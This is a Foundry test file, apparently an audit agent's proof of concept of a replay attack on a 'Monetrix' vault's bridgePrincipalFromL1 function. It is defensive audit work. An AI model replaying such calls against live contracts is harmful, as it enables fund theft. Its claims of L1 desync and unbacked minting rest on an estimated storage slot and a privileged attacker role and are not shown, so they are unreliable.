// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ATTACK TIMELINE:
// 1. [Setup] Deploy AccessController, Config, Accountant, Escrows, and Vault. Wire them together.
// 2. [T=0] Grant OPERATOR_ROLE to attacker. Set outstandingL1Principal to 1000 USDC via store.
// 3. [T=1] Attacker calls bridgePrincipalFromL1(500). L2 accounting decrements outstandingL1Principal to 500.
// 4. [T=2] Attacker replays the EXACT same bridgePrincipalFromL1(500) call.
// 5. [Assert] Because there is no nonce, deadline, or chain ID in the encoded L1 action, the replay succeeds.
//            outstandingL1Principal decrements again to 0, creating a permanent accounting desync (L2 thinks 0 owed, L1 still holds funds).

import "forge-std/Test.sol";
import "../src/core/ActionEncoder.sol";
import "../src/core/InsuranceFund.sol";
import "../src/core/MonetrixAccountant.sol";
import "../src/core/MonetrixConfig.sol";
import "../src/core/MonetrixVault.sol";
import "../src/core/PrecompileReader.sol";
import "../src/core/RedeemEscrow.sol";
import "../src/core/TokenMath.sol";
import "../src/core/YieldEscrow.sol";
import "../src/governance/IMonetrixAccessController.sol";
import "../src/governance/MonetrixAccessController.sol";
import "../src/governance/MonetrixGovernedUpgradeable.sol";
import "../src/interfaces/HyperCoreConstants.sol";
import "../src/interfaces/IHyperCore.sol";
import "../src/interfaces/IMonetrixAccountant.sol";
import "../src/interfaces/IRedeemEscrow.sol";
import "../src/interfaces/IYieldEscrow.sol";
import "../src/tokens/USDM.sol";
import "../src/tokens/sUSDM.sol";
import "../src/tokens/sUSDMEscrow.sol";

interface IERC20Mintable {
    function mint(address to, uint256 amount) external;
}

contract AuditAgentPoC is Test {
    MonetrixAccessController acl;
    MonetrixConfig config;
    MonetrixAccountant accountant;
    MonetrixVault vault;
    RedeemEscrow redeemEscrow;
    YieldEscrow yieldEscrow;
    InsuranceFund insuranceFund;
    USDM usdm;
    sUSDM susdm;
    sUSDMEscrow susdmEscrow;
    ActionEncoder actionEncoder;

    address usdc = address(0x1234);
    address admin = address(this);
    address attacker = address(0xdead);

    bytes32 constant OPERATOR_ROLE = keccak256("OPERATOR_ROLE");
    bytes32 constant GOVERNOR_ROLE = keccak256("GOVERNOR_ROLE");
    bytes32 constant GUARDIAN_ROLE = keccak256("GUARDIAN_ROLE");
    bytes32 constant VAULT_ROLE = keccak256("VAULT_ROLE");

    function setUp() public {
        acl = new MonetrixAccessController();
        acl.initialize(admin);

        acl.grantRole(GOVERNOR_ROLE, admin);
        acl.grantRole(GUARDIAN_ROLE, admin);
        acl.grantRole(OPERATOR_ROLE, attacker);

        insuranceFund = new InsuranceFund();
        insuranceFund.initialize(usdc, address(acl));

        config = new MonetrixConfig();
        config.initialize(address(insuranceFund), admin, address(acl));

        usdm = new USDM();
        usdm.initialize(address(acl));

        susdmEscrow = new sUSDMEscrow(address(usdm), address(0));
        susdm = new sUSDM();
        susdm.initialize(address(usdm), address(config), address(acl));

        accountant = new MonetrixAccountant();
        accountant.initialize(address(0), usdc, address(usdm), address(acl));

        redeemEscrow = new RedeemEscrow();
        redeemEscrow.initialize(usdc, address(0), address(acl));

        yieldEscrow = new YieldEscrow();
        yieldEscrow.initialize(usdc, address(0), address(acl));

        vault = new MonetrixVault();
        vault.initialize(
            usdc,
            address(usdm),
            address(susdm),
            address(config),
            address(0),
            address(acl)
        );

        acl.grantRole(VAULT_ROLE, address(vault));

        vm.prank(admin);
        vault.setAccountant(address(accountant));
        vm.prank(admin);
        vault.setRedeemEscrow(address(redeemEscrow));
        vm.prank(admin);
        vault.setYieldEscrow(address(yieldEscrow));

        actionEncoder = new ActionEncoder();
    }

    function test_exploit() public {
        // Step 2: Set outstandingL1Principal to 1000 USDC (simulating prior bridged principal)
        bytes32 slot = bytes32(uint256(30)); // Estimated storage slot for outstandingL1Principal
        vm.store(address(vault), slot, bytes32(uint256(1000e6)));

        uint256 olpBefore = vault.outstandingL1Principal();
        console.log("Step 2: outstandingL1Principal before =", olpBefore);
        assertEq(olpBefore, 1000e6, "Initial OLP should be 1000 USDC");

        // Step 3: Attacker calls bridgePrincipalFromL1(500)
        // The L1 balance check uses spotBalance.total instead of free balance, allowing this to pass
        // even if L1 free balance is insufficient.
        vm.prank(attacker);
        vault.bridgePrincipalFromL1(500e6);

        uint256 olpAfterFirst = vault.outstandingL1Principal();
        console.log("Step 3: outstandingL1Principal after first bridge =", olpAfterFirst);

        // Step 4: Attacker replays the EXACT same bridge action.
        // Because ActionEncoder encodes without nonce, deadline, or chain ID, the replay is valid.
        vm.prank(attacker);
        vault.bridgePrincipalFromL1(500e6);

        uint256 olpAfterReplay = vault.outstandingL1Principal();
        console.log("Step 4: outstandingL1Principal after replay =", olpAfterReplay);

        // Step 5: Assert the accounting desync.
        // The L2 accounting decremented twice (to 0), while L1 only executed once (or failed).
        // This allows the attacker to mint/withdraw unbacked USDM.
        assertEq(olpAfterReplay, 0, "Replay attack succeeded: OLP decremented twice without nonce protection");
        assertLt(olpAfterReplay, olpAfterFirst, "Accounting desync: L2 thinks principal is returned, L1 still holds it");
    }
}
